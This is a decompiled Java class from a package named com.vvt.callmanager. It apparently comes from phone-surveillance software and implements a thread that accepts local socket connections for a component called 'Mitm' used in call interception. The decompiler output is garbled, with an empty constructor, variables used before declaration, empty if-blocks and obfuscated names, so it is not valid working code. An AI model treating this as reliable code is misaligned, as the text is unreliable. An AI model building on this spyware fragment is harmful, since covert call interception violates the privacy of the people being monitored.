package com.vvt.callmanager;

import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.os.ConditionVariable;
import com.fx.daemon.exception.RunningException;
import com.fx.socket.e;
import java.io.IOException;

/**
 *
 */
class g extends Thread {
    g(Mitm paramf, LocalServerSocket paramLocalServerSocket, ConditionVariable paramConditionVariable) {}

    public void run() {
        for (;;) {
            try {
                bool = Mitm.e();
                if (bool) {}

                moSocket = this.a.accept();
                Mitm.a(this.c, moSocket);

                this.b.open();

                localObject1 = Mitm.a(this.c);
                if (localObject1 == null) {
                    bool = Mitm.f();
                    if (bool) {}
                    localObject1 = this.a;
                    if (localObject1 != null) {
                        this.a.close();
                        bool = Mitm.e();
                        if (!bool) {}
                    }
                    return;
                }
            } catch (IOException localIOException) {
                Object localObject1;
                Object localObject2;
                bool = Mitm.f();
                if (!bool) {
                    continue;
                }
                Mitm localf1 = this.c;
                Mitm.b(localf1);
                continue;
            } catch (RunningException localRunningException) {
                boolean bool = Mitm.f();
                if (!bool) {
                    continue;
                }
                Mitm localf2 = this.c;
                Mitm.b(localf2);
                continue;
            }
            bool = Mitm.e();
            if (bool) {}
            localObject2 = Mitm.a(this.c);
            localObject1 = new com.vvt.callmanager.h(this, (LocalSocket)localObject2);
            ((e)localObject1).start();
            Mitm.c(this.c);
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/g.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */